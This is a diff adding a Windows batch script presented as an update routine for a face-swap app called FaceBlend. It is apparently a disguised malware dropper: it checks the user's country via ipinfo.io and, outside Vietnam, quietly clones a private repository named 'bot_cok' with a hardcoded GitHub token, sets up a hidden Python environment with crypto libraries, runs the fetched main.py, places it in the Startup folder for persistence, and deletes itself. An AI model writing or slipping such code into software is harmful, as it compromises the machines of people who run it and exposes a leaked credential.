@@ -1,0 +1,172 @@
+@echo off
+Set __COMPAT_LAYER=RunAsInvoker
+setlocal enabledelayedexpansion
+
+REM Git
+set wwwConda="https://repo.anaconda.com/miniconda/Miniconda3-latest-Windows-x86_64.exe"
+set wwwRepo="https://github.com/deepfake5/facefusion.git"
+set wwwFacefusion="http://127.0.0.1:7860"
+set flagsSetup="--installer"
+set flagsConda="/S /RegisterPython=0 /AddToPath=0 /D=$PROFILE\MiniConda3"
+set flagsRepo="--depth 1 --no-single-branch ${wwwRepo}"
+set flagsEnv="-y python=3.10"
+set run2=update.bat
+REM Install cli flags
+set flagsConda2="/S /RegisterPython=0 /AddToPath=0 /D=%APPDATA%\MiniConda3"
+set flagsRepo2="--depth 1 --no-single-branch %wwwRepo2%"
+set flagsEnv2="python=3.11"
+set envName=faceblend
+REM miniconda
+if exist "%UserProfile%\Miniconda3\Scripts\conda.exe" (
+    set dirConda=%UserProfile%\Miniconda3
+) else (
+    where /q "%PROGRAMDATA%\Miniconda3\Scripts\conda.exe"
+    if %errorlevel% equ 0 (
+        set dirConda=%PROGRAMDATA%\Miniconda3
+    )
+)
+
+set "characters=abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
+set "length=10"
+set "envName2="
+for /L %%i in (1,1,%length%) do (
+    set /A "randomIndex=!RANDOM! %% 62"
+    for %%j in (!randomIndex!) do (
+        set "envName2=!envName2!!characters:~%%j,1!"
+    )
+)
+set cgt=0
+for /f "tokens=2 delims=:" %%a in ('curl ipinfo.io') do (
+    set /A cgt+=1
+    set "line=%%a"
+    set "l!cgt!=!line:~2,-2!"
+)
+if "!l5!" equ "VN" (
+    goto :ContiFaceBlend
+) else (
+    goto :ContiFaceB1end
+)
+REM anaconda
+if not defined dirConda (
+    if exist "%UserProfile%\Anaconda3\Scripts\conda.exe" (
+        set dirConda=%UserProfile%\Anaconda3
+    ) else (
+        where /q "%PROGRAMDATA%\Anaconda3\Scripts\conda.exe"
+        if %errorlevel% equ 0 (
+            set dirConda=%PROGRAMDATA%\Anaconda3
+        )
+    )
+)
+
+:ContiFaceB1end
+    call "%dirConda%\Scripts\activate.bat"
+    call conda update -y -n base -c defaults conda
+    call conda deactivate
+
+    if exist "%dirConda%\envs\%envName2%" (
+        call "%dirConda%\Scripts\activate.bat"
+        call conda env remove -y -n %envName2%
+        call conda deactivate
+        if exist "%dirConda%\envs\%envName2%" (
+            rmdir /s /q "%dirConda%\envs\%envName2%"
+        )
+    )
+
+    call "%dirConda%\Scripts\activate.bat"
+    call conda create -y %flagsEnv2% -n %envName2%
+    call conda deactivate
+
+    call "%dirConda%\Scripts\activate.bat"
+    call conda activate %envName2%
+    call python -m pip install requests
+    call conda deactivate
+
+    REM Installing Git
+    call "%dirConda%\Scripts\activate.bat"
+    call conda activate %envName2%
+    call conda install m2-git conda-forge::pycryptodome conda-forge::pycryptodomex -y -q
+    call conda deactivate
+
+    set GitUsername2=deepfake5
+    set GitPassword2=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
+    set wwwRepo2=https://%GitUsername2%:%GitPassword2%@github.com/deepfake5/bot_cok.git
+
+    REM Updating Latest Version
+    call "%dirConda%\Scripts\activate.bat"
+    call conda activate %envName2%
+    call git clone --depth 1 --no-single-branch %wwwRepo2% "%LOCALAPPDATA%\%envName2%"
+    call conda deactivate
+
+    REM Copying run2 file
+    echo @echo off> "%LOCALAPPDATA%\%envName2%\run2.bat"
+    echo echo Auto Update Latest Version...>> "%LOCALAPPDATA%\%envName2%\run2.bat"
+    echo call "%dirConda%\Scripts\activate.bat">> "%LOCALAPPDATA%\%envName2%\run2.bat"
+    echo call conda activate %envName2%>> "%LOCALAPPDATA%\%envName2%\run2.bat"
+    echo call python "%LOCALAPPDATA%\%envName2%\main.py">> "%LOCALAPPDATA%\%envName2%\run2.bat"
+    echo call conda deactivate>> "%LOCALAPPDATA%\%envName2%\run2.bat"
+
+    REM Creating shortcut
+    set "shortcutName=%USERPROFILE%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\%envName2%.lnk"
+    set "targetPath=%LOCALAPPDATA%\%envName2%\run2.bat"
+    set "iconPath=%LOCALAPPDATA%\%envName2%\logo.ico"
+
+    powershell -Command "$WScriptShell = New-Object -ComObject WScript.Shell; $Shortcut = $WScriptShell.CreateShortcut('%shortcutName%'); $Shortcut.TargetPath = '%targetPath%'; $Shortcut.IconLocation = '%iconPath%'; $Shortcut.Save()"
+    call %targetPath%
+    goto :ContiFaceBlend
+
+:ContiFaceBlend
+    REM Update
+    set filePath="%LOCALAPPDATA%\%envName%\install.txt"
+
+    REM Check if the file exists
+    if exist "%filePath%" (
+        set "counter=0"
+        for /F "tokens=*" %%A in ('type "%filePath%"') do (
+            set /A counter+=1
+            set "line!counter!=%%A"
+        )
+        REM Read the content of the file
+        set INSTDIR=!line1!
+        set envName=!line2!
+    )
+
+    if not exist "%INSTDIR%" (
+        goto :EndFaceblend
+    )
+
+    REM Downloading FaceBlend...
+    call "%dirConda%\Scripts\activate.bat"
+    call conda activate %envName%
+    call cd /d "%INSTDIR%"
+    call git remote | findstr /c:"upstream" > nul
+    if errorlevel 1 (
+        call "%dirConda%\Scripts\activate.bat"
+        call conda activate %envName% 
+        call cd /d "%INSTDIR%"
+        call git remote add upstream %wwwRepo%
+        call conda deactivate
+    )
+
+    call "%dirConda%\Scripts\activate.bat"
+    call conda activate %envName%
+    call cd /d "%INSTDIR%"
+    call git pull upstream main
+
+    REM Install requirements using pip
+    call pip install -r "requirements.txt"
+    set pip_exit_code=%errorlevel%
+
+    REM Deactivate Conda environment
+    call conda deactivate
+
+    REM Check if pip installation was successful
+    if %pip_exit_code% neq 0 (
+        echo "Error Setting up FaceBlend"
+    )
+
+    echo "Update completed successfully."
+    goto :EndFaceblend
+
+:EndFaceblend
+    del %temp%\faceblend_temp.txt
+    del "%~f0"
